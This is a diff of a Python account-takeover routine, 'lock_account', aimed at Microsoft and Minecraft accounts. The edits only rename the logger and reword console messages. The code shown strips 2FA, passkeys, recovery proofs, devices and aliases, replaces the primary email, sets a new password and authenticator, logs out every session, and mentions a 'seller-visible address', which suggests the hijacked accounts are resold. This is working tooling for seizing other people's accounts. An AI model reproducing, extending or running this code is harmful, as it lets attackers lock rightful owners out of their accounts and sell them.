@@ -44,7 +44,7 @@ import uuid
 import json
 import logging
 
-log = logging.getLogger(__name__)
+rom = logging.getLogger(__name__)
 
 MC_CHECK_FAILED_LABEL = "Unknown (MC check failed)"
 
@@ -286,14 +286,14 @@ async def lock_account(
         from authsecuring.utils.proxy import format_exception_reason
 
         detail = proxy_error_reason(exc)
-        log.exception("get_amc failed: %s", detail)
+        rom.exception("get_amc failed: %s", detail)
         print(f"[X] - get_amc failed: {detail}")
         raise
 
     apicanary = await fetch_canary(session)
     if not apicanary:
         print("[!] - No apiCanary from password/reset — will retry later for SA ops")
-        log.warning("get_cookies returned no apiCanary — continuing into MC check")
+        rom.warning("get_cookies returned no apiCanary — continuing into MC check")
 
     t = None
     try:
@@ -304,7 +304,7 @@ async def lock_account(
         else:
             print("[!] - No classic login t token (already signed in) — skipping AMRP")
     except Exception as exc:
-        log.warning("get_t/amrp failed — continuing with existing session: %s", exc)
+        rom.warning("get_t/amrp failed — continuing with existing session: %s", exc)
         print(f"[!] - get_t/AMRP skipped ({exc.__class__.__name__}) — continuing")
 
 
@@ -322,7 +322,7 @@ async def lock_account(
             # proxy/XBL races that usually clear on the next try within seconds.
             delay = 5.0
             print(f"[~] - MC check inconclusive (attempt {attempt}/{mc_attempts}), retrying in {delay:.0f}s...")
-            log.warning("MC check transient failure attempt %s/%s — sleeping %.1fs", attempt, mc_attempts, delay)
+            rom.warning("MC check transient failure attempt %s/%s — sleeping %.1fs", attempt, mc_attempts, delay)
             await asyncio.sleep(delay)
         else:
             print(f"[x] - MC check still failed after retries — keeping '{account_info['minecraft'].get('name')}'")
@@ -330,7 +330,7 @@ async def lock_account(
                 account_info["minecraft"]["name"] = MC_CHECK_FAILED_LABEL
             if account_info["minecraft"].get("method") in (None, "", "Not purchased"):
                 account_info["minecraft"]["method"] = "Unknown (MC check failed)"
-            log.error(
+            rom.error(
                 "MC check failed after %s attempts for %s (gamertag=%s) — NOT confirming no MC",
                 mc_attempts,
                 account_info.get("microsoft", {}).get("email"),
@@ -345,7 +345,7 @@ async def lock_account(
                 "[!] - Embed verify: no Minecraft Java — "
                 "stopping before credential change"
             )
-            log.info(
+            rom.info(
                 "embed verify no Minecraft Java for %s (name=%s method=%s)",
                 account_info.get("microsoft", {}).get("email"),
                 account_info.get("minecraft", {}).get("name"),
@@ -406,7 +406,7 @@ async def lock_account(
             if left.get("attempted") and isinstance(remaining, list):
                 family = {**family, "members": remaining}
     except Exception as exc:
-        log.warning("leave_family soft-fail: %s", exc)
+        rom.warning("leave_family soft-fail: %s", exc)
         print(f"[!] - leave_family skipped ({exc.__class__.__name__})")
 
     print("[+] - Got DOB (Subscriptions, Family, Devices, Card...)")
@@ -437,8 +437,8 @@ async def lock_account(
     if apicanary:
         await drop_2fa(session, apicanary)
     else:
-        print("[!] - Skipping remove_2fa (no apiCanary)")
-        log.warning("skipping remove_2fa — no apiCanary")
+        print("[!] - [~] skip 2fa (no apiCanary)")
+        rom.warning("skipping remove_2fa — no apiCanary")
 
     ms = account_info.get("microsoft") or {}
     existing_recovery = ms.get("recovery_code")
@@ -481,7 +481,7 @@ async def lock_account(
             or "proofs page" in msg
         )
         if abuse_blocked or (has_recovery and i5600_blocked):
-            log.warning(
+            rom.warning(
                 "security_information soft-skip after recover for %s: %s",
                 ms.get("email"),
                 msg[:300],
@@ -506,7 +506,7 @@ async def lock_account(
         # Freeze seller-visible address before any primary alias replace
         if not account_info["microsoft"].get("original_email"):
             account_info["microsoft"]["original_email"] = main_email
-    print(f"[+] - Got Security Parameters (primary={account_info['microsoft']['email']})")
+    print(f"[+] - [+] security params (primary={account_info['microsoft']['email']})")
 
     encryptedNetID = None
     if security_parameters:
@@ -514,7 +514,7 @@ async def lock_account(
             encryptedNetID = security_parameters["WLXAccount"]["manageProofs"]["encryptedNetId"]
         except (KeyError, TypeError):
             encryptedNetID = None
-            log.warning("security_parameters missing manageProofs.encryptedNetId")
+            rom.warning("security_parameters missing manageProofs.encryptedNetId")
 
     if recovery or not has_recovery:
         generated_code = None
@@ -535,7 +535,7 @@ async def lock_account(
         recovery_code = existing_recovery
         print(f"[+] - Keeping existing recovery code from recovery flow")
 
-    print(f"[+] - Got Recovery Code | {recovery_code}")
+    print(f"[+] - [+] recovery code | {recovery_code}")
 
     if minecon:
         account_info["microsoft"]["email"] = main_email or account_info["microsoft"]["email"]
@@ -560,7 +560,7 @@ async def lock_account(
                 if isinstance(fed, dict):
                     account_info["microsoft"]["fed_cred_removed"] = fed.get("removed") or []
             except Exception as exc:
-                log.warning("remove_fed_cred soft-fail: %s", exc)
+                rom.warning("remove_fed_cred soft-fail: %s", exc)
                 print(f"[!] - remove_fed_cred skipped ({exc.__class__.__name__})")
             # Wipe foreign proofs / passkeys (iCloud Keychain, Samsung Pass,
             # Google Password Manager via RemovePasskey) / auth apps —
@@ -582,21 +582,21 @@ async def lock_account(
             else:
                 account_info["microsoft"]["has_sms_proof"] = False
         else:
-            print("[!] - Skipping remove_zyger/remove_fed_cred/remove_proof (no apiCanary)")
+            print("[!] - [~] skip passkeys/remove_fed_cred/remove_proof (no apiCanary)")
             account_info["microsoft"]["has_sms_proof"] = None
 
         # Third Party Launchers (Minecraft, Prism)
         try:
             await strip_app_links(session)
         except Exception as exc:
-            log.warning("remove_services soft-fail: %s", exc)
+            rom.warning("remove_services soft-fail: %s", exc)
             print(f"[!] - remove_services skipped ({exc.__class__.__name__})")
 
         # Remove Microsoft Devices
         try:
             await purge_devices(session, verification_tokens["devices"], devices)
         except Exception as exc:
-            log.warning("remove_devices soft-fail: %s", exc)
+            rom.warning("remove_devices soft-fail: %s", exc)
             print(f"[!] - remove_devices skipped ({exc.__class__.__name__})")
 
         # Seed login email before alias replace (updated only if MakePrimary wins)
@@ -623,9 +623,9 @@ async def lock_account(
                 )
                 account_info["microsoft"]["primary_alias_replaced"] = True
                 # Still strip foreign aliases (old outlook / gmail / etc.)
-                print("[~] - Removing foreign aliases while keeping sunny primary")
+                print("[~] - [~] wipe aliases while keeping sunny primary")
             else:
-                print("[~] - Changing Primary Alias")
+                print("[~] - [~] swap primary")
                 changed = False
                 last_local = ""
                 max_alias_attempts = 3
@@ -637,13 +637,13 @@ async def lock_account(
                     if pending_sunny_local:
                         primaryEmail = pending_sunny_local
                         print(
-                            f"[~] - Primary alias attempt {attempt}/{max_alias_attempts} "
+                            f"[~] - primary attempt {attempt}/{max_alias_attempts} "
                             f"(re-promote {primaryEmail}@outlook.com)"
                         )
                     else:
                         primaryEmail = f"sunny{uuid.uuid4().hex[:12]}"
                         print(
-                            f"[~] - Primary alias attempt {attempt}/{max_alias_attempts} "
+                            f"[~] - primary attempt {attempt}/{max_alias_attempts} "
                             f"({primaryEmail}@outlook.com)"
                         )
                     last_local = primaryEmail
@@ -728,7 +728,7 @@ async def lock_account(
                                 )
                                 break
                     except Exception as exc:
-                        log.warning(
+                        rom.warning(
                             "primary replace post-check failed: %s", exc
                         )
 
@@ -758,7 +758,7 @@ async def lock_account(
             password = make_ms_password(14)
 
             security_email = f"{security_email}@{domain}"
-            print(f"[+] - Generated Security Email ({security_email})")
+            print(f"[+] - [+] sec email ({security_email})")
             with DBConnection() as database:
                 database.add_security_email(security_email, password)
 
@@ -779,7 +779,7 @@ async def lock_account(
                     "[!] - RecoverUser without proofs t0 "
                     "(i5600 soft-skip / no security_parameters)"
                 )
-            print(f"[~] - Automaticly Securing Account... ({recover_login})")
+            print(f"[~] - [~] locking Account... ({recover_login})")
             try:
                 data = await recover(
                     session,
@@ -810,12 +810,12 @@ async def lock_account(
                 account_info["microsoft"]["recovery_code"] = data
                 account_info["microsoft"]["password"] = password
             else:
-                print(f"[X] - Failed to secure this account")
+                print(f"[X] - [x] secure failed this account")
                 account_info["microsoft"]["recover_error"] = (
-                    "RecoverUser returned no recovery code"
+                    "recover result = no recovery code"
                 )
                 raise RuntimeError(
-                    "RecoverUser returned no recovery code after primary alias change"
+                    "recover result = no recovery code after primary alias change"
                 )
 
         # Delete other login aliases (non-fatal — manage page often lacks canary)
@@ -835,7 +835,7 @@ async def lock_account(
             )
         except Exception as exc:
             logging.warning("delete_aliases soft-skip: %s", exc)
-            print(f"[~] - Skipping alias removal ({exc.__class__.__name__})")
+            print(f"[~] - [~] skip alias wipe ({exc.__class__.__name__})")
 
         # Always verify password stuck after RecoverUser — MS often rotates the
         # recovery code while silently ignoring the new password. Previously we
@@ -861,7 +861,7 @@ async def lock_account(
                 account_info["microsoft"]["auth_secret"] = auth
                 print(f"[+] - Added Authenticator ({auth})")
             except Exception as exc:
-                log.exception("add_authenticator failed")
+                rom.exception("add_authenticator failed")
                 print(f"[X] - Failed to add authenticator: {exc.__class__.__name__}: {exc}")
                 account_info["microsoft"]["auth_secret"] = "Failed"
         else:
@@ -874,9 +874,9 @@ async def lock_account(
                 await kick_sessions(session, apicanary)
             except Exception as exc:
                 logging.warning("logout_all soft-skip: %s", exc)
-                print(f"[~] - Skipping logout_all ({exc.__class__.__name__})")
+                print(f"[~] - [~] skip logout ({exc.__class__.__name__})")
         else:
-            print("[!] - Skipping logout_all (no apiCanary)")
+            print("[!] - [~] skip logout (no apiCanary)")
 
         # Phone pullback probe — HasPhone can stay 1 even when smsProofs is empty
         # on the manage page (ghost phone / legacy SMS recovery).
@@ -907,5 +907,5 @@ async def lock_account(
             logging.warning("HasPhone probe soft-skip: %s", exc)
             account_info["microsoft"]["has_phone"] = None
         
-    print("[+] - Account has been secured")
+    print("[+] - [+] secured")
     return account_info
